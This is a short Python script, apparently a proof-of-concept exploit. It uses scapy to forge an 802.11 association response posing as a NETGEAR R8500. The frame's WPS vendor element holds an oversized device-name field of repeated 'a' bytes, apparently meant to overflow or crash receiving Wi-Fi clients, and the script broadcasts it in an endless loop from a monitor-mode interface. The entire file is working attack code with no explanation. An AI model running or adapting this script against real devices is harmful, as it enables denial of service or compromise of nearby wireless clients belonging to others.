#!/usr/bin/python
import sys
from scapy.all import *
probeResp = RadioTap()/Dot11(addr1="00:01:02:03:04:05", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")/Dot11AssoResp(cap='short-slot+res12+ESS+privacy')/Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96$0Hl')/Dot11Elt(ID="ESRates", info='\x0c\x12\x18`')/Dot11Elt(ID="vendor", info='\x00P\xf2\x04\x10J\x00\x01\x10\x10D\x00\x01\x02\x10;\x00\x01\x03\x10G\x00\x10\xc2\xe5\x1a0\xc59\xf9\xff\xe5\xa8\xd2\xac\xd1\x8d\x9b\xf6\x10!\x00\rNETGEAR, Inc.\x10#\x00\x05R8500\x10$\x00\x05R8500\x10B\x00\x0232\x10T\x00\x08\x00\x06\x00P\xf2\x04\x00\x01\x10\x11\x00\x7daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x10\x08\x00\x02 \x08\x10<\x00\x01\x03\x10I\x00\x06\x007*\x00\x01 ')/Dot11Elt(ID="vendor", info='\x00\x10\x18\x02\x00\x00\x0c\x00\x00')/Dot11Elt(ID="vendor", info="\x00P\xf2\x02\x01\x01\x80\x00\x03\xa4\x00\x00'\xa4\x00\x00BC^\x00b2/\x00")
conf.iface = "wlan0mon"
sendp(probeResp,inter=.2,loop=1)